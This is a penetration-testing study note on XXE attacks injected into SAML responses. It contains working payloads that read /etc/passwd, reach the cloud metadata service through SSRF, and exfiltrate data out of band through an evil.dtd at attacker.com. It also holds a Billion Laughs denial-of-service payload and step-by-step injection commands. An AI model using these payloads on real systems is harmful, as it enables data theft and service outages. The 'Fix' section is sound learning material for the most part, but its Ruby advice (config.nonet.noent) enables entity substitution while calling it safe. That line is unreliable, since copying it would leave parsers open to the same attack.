---
tags: [vapt, saml, xxe, intermediate]
difficulty: intermediate
module: "20 - SAML"
topic: "20.07 SAML External Entity (SAML + XXE)"
---

# 20.07 — SAML External Entity (SAML + XXE)

## The Intersection of SAML and XXE

```
SAML IS XML:
  SAML assertions are XML documents
  XML has a feature: XML External Entities (XXE)
  
  XXE ALLOWS:
  XML to include content from external files or URLs:
  
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <saml:Assertion>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Assertion>
  
  → If parser resolves external entities:
  → NameID contains contents of /etc/passwd!
  
  This is the classic XXE attack, but injected into a SAML assertion!
```

---

## Basic XXE in SAMLResponse

```xml
PAYLOAD — File Read:
  <samlp:Response ...>
    <!DOCTYPE samlp:Response [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <saml:Assertion ...>
      <saml:NameID>&xxe;</saml:NameID>
      ...
    </saml:Assertion>
  </samlp:Response>

WHAT HAPPENS IF VULNERABLE:
  SP's XML parser resolves &xxe; → reads /etc/passwd
  Contents go into the NameID value
  SP tries to look up this user → might fail
  BUT: error message might reveal file contents!
  OR: SP logs the NameID → /etc/passwd in logs!

ALTERNATIVE: SSRF via XXE
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  → SP's XML parser makes HTTP request to AWS metadata service!
  → SSRF: internal network access, cloud credentials!
```

---

## Out-of-Band XXE (OOB-XXE) via SAML

```xml
WHEN RESPONSE DOESN'T ECHO CONTENT:
  Use out-of-band technique to exfiltrate:
  
PAYLOAD:
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
  ]>
  
  evil.dtd (hosted by attacker):
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
  %param1;
  
  Then in XML body: &exfil;
  
  → Parser loads evil.dtd from attacker
  → evil.dtd loads /etc/passwd
  → Exfiltrates /etc/passwd to attacker's HTTP server!

ATTACKER RECEIVES:
  GET /?data=root:x:0:0:root:/root:/bin/bash
       daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
       ...
```

---

## Billion Laughs (DoS via XXE)

```xml
DOS ATTACK — EXHAUSTS PARSER MEMORY:

  <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  ]>
  <samlp:Response>
    <saml:NameID>&lol9;</saml:NameID>
  </samlp:Response>
  
  → Expanding lol9 = 10^9 (1 billion) "lol" strings = ~3GB in memory!
  → Parser crashes / server OOM!
  → DoS against SAML endpoint!
```

---

## Testing for SAML XXE

```bash
# STEP 1: Decode your valid SAMLResponse
echo "SAML_BASE64" | base64 -d > saml.xml

# STEP 2: Add DOCTYPE with XXE payload at top of XML
cat > xxe_saml.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR_HERE/">
]>
EOF
# Then append original XML (after <?xml?> declaration if any)

# STEP 3: Inject entity reference into NameID:
# Modify: <saml:NameID>ORIGINAL</saml:NameID>
# To:     <saml:NameID>&xxe;</saml:NameID>

# STEP 4: Re-encode and submit:
python3 -c "
import base64
xml = open('xxe_saml.xml').read()
print(base64.b64encode(xml.encode()).decode())
"

# STEP 5: Watch Burp Collaborator for HTTP requests
# → Request received? → XXE confirmed (SSRF)!

# ALSO TEST FILE READ:
# Change entity to: SYSTEM "file:///etc/passwd"
# Submit → check if error message or response contains file contents

# NOTE: Signature will be invalid → test if SP even validates signature first
# (If no signature validation → all XXE tests possible without valid sig)
```

---

## Fix

```
PREVENTING XXE IN SAML PARSERS:

1. DISABLE DOCTYPE DECLARATIONS IN PARSER:
   Java (using SAXParserFactory):
   SAXParserFactory factory = SAXParserFactory.newInstance();
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   
   Python (using defusedxml):
   # NEVER use xml.etree.ElementTree for untrusted XML!
   # Use defusedxml:
   import defusedxml.ElementTree as ET
   tree = ET.fromstring(xml_string)  # safely blocks XXE
   
   # Or lxml with no_network and resolve_entities=False:
   from lxml import etree
   parser = etree.XMLParser(
       no_network=True,
       resolve_entities=False,
       load_dtd=False
   )
   
   Ruby:
   Nokogiri::XML(xml) { |config| config.nonet.noent }

2. USE SAFE SAML LIBRARIES:
   python3-saml uses defusedxml → safe
   ruby-saml uses Nokogiri with safe flags → safe
   
   OLD VERSIONS may not have these protections → update!

3. REJECT DOCTYPE IN SAML VALIDATION:
   Strip or reject any SAMLResponse containing DOCTYPE declarations
   Before even parsing: check for "<!DOCTYPE" → reject

4. VALIDATE AGAINST SCHEMA:
   SAML schema doesn't include DOCTYPE entities in valid SAML
   Strict schema validation → DOCTYPE → schema violation → reject
```

---

## Related Notes
- [[14 - XXE — What is XXE]] — full XXE module
- [[02 - SAML Assertion Structure]] — SAML XML structure
- [[03 - XML Signature Wrapping (XSW) Attacks]] — other XML attacks
- [[10 - Defense — Strict Schema Validation, Signed Assertions]] — full fix
